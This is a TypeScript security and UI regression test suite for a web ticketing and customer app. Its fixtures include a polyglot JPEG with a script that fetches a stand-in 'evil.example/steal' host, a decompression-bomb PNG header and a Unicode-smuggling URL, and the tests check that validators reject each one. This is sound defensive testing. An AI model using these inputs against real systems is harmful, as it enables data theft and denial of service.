import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { NextRequest } from 'next/server';
import { middleware } from '../../../apps/web/src/middleware';
import {
  validateImageUploadBuffer,
  MAX_IMAGE_DIMENSION_PX,
} from '../../../apps/web/src/server/lib/image-validation';
import { withSplitterPortMutex } from '../../../apps/web/src/server/lib/port-mutex';
import { resolveRepoRoot } from '../helpers/auth-test-harness';

describe('Tier 1: Feature 26 - Adversarial Hardening & Commercial End-User UI/UX Readiness', () => {
  const repoRoot = resolveRepoRoot();

  it('1. serializes concurrent TOCTOU ODP port mutations via withSplitterPortMutex without race interleaving', async () => {
    const executionOrder: string[] = [];

    const taskA = withSplitterPortMutex('ODP-PLB-001', 3, async () => {
      executionOrder.push('A:start');
      await new Promise((r) => setTimeout(r, 35));
      executionOrder.push('A:end');
      return 'A';
    });

    const taskB = withSplitterPortMutex('ODP-PLB-001', 3, async () => {
      executionOrder.push('B:start');
      await new Promise((r) => setTimeout(r, 10));
      executionOrder.push('B:end');
      return 'B';
    });

    // Different port on same ODP must NOT be blocked by Port 3 lock
    const taskOtherPort = withSplitterPortMutex('ODP-PLB-001', 4, async () => {
      executionOrder.push('P4:ran');
      return 'P4';
    });

    await Promise.all([taskA, taskB, taskOtherPort]);

    const aEndIdx = executionOrder.indexOf('A:end');
    const bStartIdx = executionOrder.indexOf('B:start');
    assert.ok(
      aEndIdx !== -1 && bStartIdx !== -1 && aEndIdx < bStartIdx,
      `Concurrent requests on ODP-PLB-001#3 must execute serially without TOCTOU overlap (got ${executionOrder.join(' -> ')})`,
    );
  });

  it('2. blocks polyglot JPEG+Script payloads and decompression-bomb image dimensions (>8192px)', () => {
    // 2a. Polyglot file: valid JPEG magic bytes (FF D8 FF E0) followed by embedded <script> payload
    const polyglotBuf = Buffer.concat([
      Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]),
      Buffer.from('<html><body><script>fetch("https://evil.example/steal")</script></body></html>'),
      Buffer.from([0xff, 0xd9]),
    ]);
    const polyglotFile = {
      name: 'opm-proof.jpg',
      size: polyglotBuf.length,
      type: 'image/jpeg',
    } as unknown as File;

    assert.throws(
      () => validateImageUploadBuffer(polyglotFile, polyglotBuf),
      (err: Error & { statusCode?: number }) =>
        err.statusCode === 415 && /skrip|markup|berbahaya/i.test(err.message),
      'Polyglot JPEG containing <script>/<html> must be rejected with HTTP 415',
    );

    // 2b. PNG Decompression Bomb: valid 64-byte PNG header declaring 65000 x 65000 pixels (4.225 GP)
    const pngBombBuf = Buffer.alloc(64);
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]).copy(pngBombBuf, 0);
    pngBombBuf.writeUInt32BE(13, 8);
    pngBombBuf.write('IHDR', 12, 'ascii');
    pngBombBuf.writeUInt32BE(65000, 16); // width > MAX_IMAGE_DIMENSION_PX (8192)
    pngBombBuf.writeUInt32BE(65000, 20); // height > MAX_IMAGE_DIMENSION_PX (8192)

    const pngBombFile = {
      name: 'bomb.png',
      size: pngBombBuf.length,
      type: 'image/png',
    } as unknown as File;

    assert.throws(
      () => validateImageUploadBuffer(pngBombFile, pngBombBuf),
      (err: Error & { statusCode?: number }) =>
        err.statusCode === 413 && err.message.includes(String(MAX_IMAGE_DIMENSION_PX)),
      'PNG decompression bomb (65000x65000) must be rejected with HTTP 413',
    );
  });

  it('3. middleware rejects >1MB JSON payload floods (413) and invisible Zero-Width / BiDi Unicode smuggling (400)', async () => {
    const oversizedJsonReq = new NextRequest('http://localhost:3000/api/v1/auth/login', {
      method: 'POST',
      headers: {
        'content-type': 'application/json',
        'content-length': String(2 * 1024 * 1024), // 2 MB > 1 MB cap
      },
    });
    const oversizedRes = await middleware(oversizedJsonReq);
    assert.strictEqual(
      oversizedRes.status,
      413,
      'Non-multipart API request exceeding 1MB Content-Length must be rejected with 413',
    );

    // BiDi Right-to-Left Override (\u202E) / Zero-Width Space (\u200B) smuggling in URL query
    const smuggledUrl =
      'http://localhost:3000/api/v1/admin/customers?search=superadmin%E2%80%8B%E2%80%AE';
    const smuggledReq = new NextRequest(smuggledUrl, { method: 'GET' });
    const smuggledRes = await middleware(smuggledReq);
    assert.strictEqual(
      smuggledRes.status,
      400,
      'URL containing Zero-Width (\u200B) or BiDi Override (\u202E) must be rejected with 400',
    );
  });

  it('4. verifies end-user UI readiness: complete ticket lifecycle tabs, zero dead controls, zero PRD/DB leaks, and mobile offline logout guard', () => {
    const overviewQueueSrc = fs.readFileSync(
      path.join(
        repoRoot,
        'apps',
        'web',
        'src',
        'features',
        'overview',
        'components',
        'overview-ticket-queue.tsx',
      ),
      'utf8',
    );
    assert.match(
      overviewQueueSrc,
      /'Menunggu verifikasi'/,
      'OverviewTicketQueue must include Menunggu verifikasi tab',
    );
    assert.doesNotMatch(
      overviewQueueSrc,
      /<button className="button-filter" type="button" aria-label="Buka filter lanjutan">/,
      'Dead button without onClick must be replaced by functional Link in OverviewTicketQueue',
    );

    const ticketFiltersSrc = fs.readFileSync(
      path.join(
        repoRoot,
        'apps',
        'web',
        'src',
        'features',
        'tickets',
        'components',
        'ticket-filters.tsx',
      ),
      'utf8',
    );
    assert.match(
      ticketFiltersSrc,
      /label:\s*'Menunggu verifikasi'/,
      'TicketFilters must include Menunggu verifikasi tab',
    );
    assert.match(
      ticketFiltersSrc,
      /label:\s*'Selesai'/,
      'TicketFilters must include Selesai tab',
    );

    const customersViewSrc = fs.readFileSync(
      path.join(
        repoRoot,
        'apps',
        'web',
        'src',
        'features',
        'customers',
        'components',
        'customers-view.tsx',
      ),
      'utf8',
    );
    const monitoringViewSrc = fs.readFileSync(
      path.join(
        repoRoot,
        'apps',
        'web',
        'src',
        'features',
        'monitoring',
        'components',
        'monitoring-view.tsx',
      ),
      'utf8',
    );
    const techniciansViewSrc = fs.readFileSync(
      path.join(
        repoRoot,
        'apps',
        'web',
        'src',
        'features',
        'technicians',
        'components',
        'technicians-view.tsx',
      ),
      'utf8',
    );

    assert.doesNotMatch(
      `${customersViewSrc}\n${monitoringViewSrc}`,
      /\(PRD\s+(?:Section\s+)?\d/i,
      'Customer and Monitoring subtitles must not leak internal PRD document references to end-users',
    );
    assert.doesNotMatch(
      `${customersViewSrc}\n${techniciansViewSrc}`,
      /PostgreSQL Master Data:\s*Aktif|Redis Session Store:\s*Aktif/,
      'Customer and Technician views must not display hardcoded static DB/Redis status claims',
    );

    const mobileListSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'mobile', 'src', 'screens', 'TicketListScreen.tsx'),
      'utf8',
    );
    assert.match(
      mobileListSrc,
      /showLogoutConfirm[\s\S]*?offlineQueueCount\s*>\s*0/,
      'Mobile TicketListScreen must protect against accidental logout when offlineQueueCount > 0',
    );
  });

  it('5. hardens /login form against GET URL credential leaks, removes showPassword eye icon, unlocks Kirim OTP button, and enables non-eval dev source maps', async () => {
    const leakedLoginReq = new NextRequest(
      'http://localhost:3000/login?username=superadmin&password=Secret123!&next=%2Ftickets',
      { method: 'GET' },
    );
    const leakedLoginRes = await middleware(leakedLoginReq);
    assert.strictEqual(
      leakedLoginRes.status,
      303,
      'Middleware must redirect (303) /login requests that leak username/password in URL query params',
    );
    assert.strictEqual(
      leakedLoginRes.headers.get('location'),
      'http://localhost:3000/login?next=%2Ftickets',
      'Redirected /login URL must strip username/password while preserving next parameter',
    );

    const loginViewSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'web', 'src', 'features', 'auth', 'components', 'login-view.tsx'),
      'utf8',
    );
    const mobileLoginSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'mobile', 'src', 'screens', 'LoginScreen.tsx'),
      'utf8',
    );
    const nextCfgSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'web', 'next.config.ts'),
      'utf8',
    );

    assert.match(
      loginViewSrc,
      /<form[^>]*method="post"/i,
      'Web LoginView <form> must declare method="post" to prevent native GET credential leakage into URL',
    );
    assert.doesNotMatch(
      loginViewSrc,
      /showPassword|toggleShowPassword|auth-password-toggle/,
      'Web LoginView must not include showPassword toggle or eye icon button',
    );
    assert.doesNotMatch(
      mobileLoginSrc,
      /showPassword|setShowPassword|EyeOffIcon/,
      'Mobile LoginScreen must not include showPassword toggle or eye icon button',
    );
    assert.doesNotMatch(
      loginViewSrc,
      /disabled=\{[\s\S]*?!username\.trim\(\)\s*\|\|\s*!password[\s\S]*?\}\s*className="auth-request-otp-btn"/,
      'Kirim OTP button must not be locked by !username.trim() || !password in SSR/autofill',
    );
    assert.match(
      nextCfgSrc,
      /unsafe-eval/,
      'next.config.ts must allow unsafe-eval in dev mode so Next.js 15 eval-source-map hydration is never blocked by CSP',
    );
    assert.doesNotMatch(
      nextCfgSrc,
      /Clear-Site-Data/,
      'next.config.ts must not emit Clear-Site-Data on /mobile which would wipe the Admin Web Dashboard session cookie',
    );

    const rateLimitHookSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'web', 'src', 'hooks', 'use-rate-limit-countdown.ts'),
      'utf8',
    );
    const useLoginSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'web', 'src', 'features', 'auth', 'hooks', 'use-login.ts'),
      'utf8',
    );
    assert.match(
      rateLimitHookSrc,
      /window\.localStorage\.setItem\(storageKey/,
      'useRateLimitCountdown must persist expiration timestamp to localStorage when storageKey is provided',
    );
    assert.match(
      useLoginSrc,
      /WEB_LOGIN_RATE_LIMIT_STORAGE_KEY/,
      'useLogin must persist login rate-limit cooldown across page refreshes',
    );
    assert.match(
      mobileLoginSrc,
      /MOBILE_RATE_LIMIT_UNTIL_KEY/,
      'Mobile LoginScreen must persist login rate-limit cooldown across refreshes',
    );
  });

  it('8. verifies ModalOverlay StrictMode dialog close guard and Customer UX fixes (single upload button, ODP port detail, address ellipsis, simplified Wilayah bar)', () => {
    const modalOverlaySrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'web', 'src', 'components', 'ui', 'modal-overlay.tsx'),
      'utf8',
    );
    const customerProfileSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'web', 'src', 'features', 'customers', 'components', 'customer-profile-view.tsx'),
      'utf8',
    );
    const customerDetailModalSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'web', 'src', 'features', 'customers', 'components', 'customer-detail-modal.tsx'),
      'utf8',
    );
    const customerTableSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'web', 'src', 'features', 'customers', 'components', 'customer-table.tsx'),
      'utf8',
    );
    const customersCss = fs.readFileSync(
      path.join(repoRoot, 'apps', 'web', 'src', 'styles', 'features', 'customers.css'),
      'utf8',
    );

    assert.match(
      modalOverlaySrc,
      /if\s*\(\s*isUnmountingRef\.current\s*\|\|\s*dialog\.open\s*\)/,
      'ModalOverlay handleClose must ignore stale async close events while dialog.open is true under React 19 StrictMode',
    );
    assert.match(
      customerProfileSrc,
      /isSuperAdmin\s*&&\s*customer\.photoUrl/,
      'CustomerProfileView must hide header upload button when photoUrl is absent so only one upload photo button renders',
    );
    assert.match(
      customerProfileSrc,
      /Port ODP Tersambung/,
      'CustomerProfileView must explicitly display connected ODP port details',
    );
    assert.doesNotMatch(
      customerDetailModalSrc,
      /<CustomerProfileEditModal[\s\S]*<\/ModalOverlay>/,
      'CustomerDetailModal must render CustomerProfileEditModal as a sibling outside its parent ModalOverlay',
    );
    assert.match(
      customerTableSrc,
      /Pratinjau/,
      'CustomerTable quick-preview action must use clear label "Pratinjau"',
    );
    assert.match(
      customersCss,
      /\.customer-address-text\s*\{[\s\S]*text-overflow:\s*ellipsis/,
      'customers.css must apply text-overflow: ellipsis on long customer installation addresses',
    );
  });
});
